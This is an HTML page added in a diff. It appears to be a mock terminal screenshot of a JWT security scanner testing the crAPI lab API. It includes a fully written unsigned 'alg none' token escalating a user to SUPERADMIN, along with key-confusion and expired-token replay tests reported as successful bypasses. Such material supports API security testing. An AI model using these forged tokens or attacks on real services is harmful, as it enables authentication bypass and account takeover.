@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', 'Courier New', monospace; }
+  body { background: #0a0d14; padding: 25px; display: flex; justify-content: center; align-items: center; height: 100vh; }
+  .box { width: 100%; max-width: 1100px; background: #0d1117; border: 1.5px solid #30363d; border-radius: 8px; box-shadow: 0 12px 36px rgba(0,0,0,0.6); overflow: hidden; font-size: 12px; }
+  .header { background: #161b22; padding: 10px 16px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }
+  .title { color: #58a6ff; font-weight: bold; font-size: 13px; }
+  .content { padding: 20px; color: #c9d1d9; line-height: 1.5; white-space: pre-wrap; height: 600px; }
+  .c-green { color: #3fb950; font-weight: bold; }
+  .c-yellow { color: #d29922; }
+  .c-red { color: #f85149; font-weight: bold; }
+  .c-cyan { color: #58a6ff; }
+</style>
+</head>
+<body>
+  <div class="box">
+    <div class="header">
+      <div class="title">🔑 OFFAT-X JSON Web Token (JWT) Security Assessment Engine</div>
+      <div style="font-size:11px; color:#8b949e;">Module: pkg/jwt • Target: POST /identity/api/auth/vtoken</div>
+    </div>
+    <div class="content">$ offat-x -f ./openapi.json -b https://api.crapi.local -jwt -H "Authorization: Bearer eyJhbGci..."
+
+<span class="c-cyan">[*] Inspecting Baseline JWT Token Claims & Signatures...</span>
+    • Header:  {"alg": "RS256", "typ": "JWT", "kid": "pubkey-2026-v1"}
+    • Payload: {"sub": "user_4291", "role": "USER", "email": "user@example.com", "exp": 1792750000}
+
+<span class="c-cyan">[*] Executing Autonomous JWT Attack Battery:</span>
+
+<span class="c-red">[VULN] Test 1: Algorithm 'none' Signature Strip Attack</span>
+    • Tampered Header:  {"alg": "none", "typ": "JWT"}
+    • Tampered Payload: {"sub": "user_4291", "role": "SUPERADMIN"}
+    • Injected Token:   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzQyOTEiLCJyb2xlIjoiU1VQRVJBRE1JTiJ9.
+    • Response Status:  <span class="c-red">200 OK (AUTHENTICATION BYPASS CONFIRMED!)</span>
+    • CVSS v3.1:        <span class="c-red">9.1 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)</span>
+
+<span class="c-red">[VULN] Test 2: RS256 -> HS256 Key Confusion Exploit</span>
+    • Encoded payload signed with RSA Public Key as HMAC secret
+    • Response Status:  <span class="c-red">200 OK (Key Confusion Accepted!)</span>
+    • CVSS v3.1:        <span class="c-red">8.6 HIGH</span>
+
+<span class="c-yellow">[VULN] Test 3: Expired Token Replay Acceptance</span>
+    • Injected token with 'exp' timestamp set 72 hours in the past
+    • Response Status:  <span class="c-yellow">200 OK (Token Expiry Validation Missing)</span>
+    • CVSS v3.1:        <span class="c-yellow">7.4 HIGH</span>
+
+<span class="c-cyan">[STATIC ANALYSIS] Missing Token Defense Checklist:</span>
+    [!] Missing 'iss' (issuer) validation claim
+    [!] Missing 'aud' (audience) verification claim
+    [✔] Token length > 128 bytes</div>
+  </div>
+</body>
+</html>
